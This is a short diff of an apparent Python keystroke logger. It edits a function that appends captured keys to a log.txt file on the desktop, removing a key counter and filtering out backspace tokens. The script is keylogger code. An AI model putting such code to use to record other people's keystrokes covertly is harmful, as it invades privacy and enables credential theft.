@@ -25,12 +25,9 @@ def key_press(key):
 def write_file(keys):
     os.chdir(r"C:\Users\Me\Desktop")
     with open("log.txt", "a") as f:
-        nr_of_keys = 0
         for key in keys:
-            k = str(key).replace("'", "").replace("Key.space", " ")
-            nr_of_keys += 1
+            k = str(key).replace("'", "").replace("Key.space", " ").replace("Key.backspace", "")
             f.write(k)
-            print(nr_of_keys)
 
 
 def key_release(key):
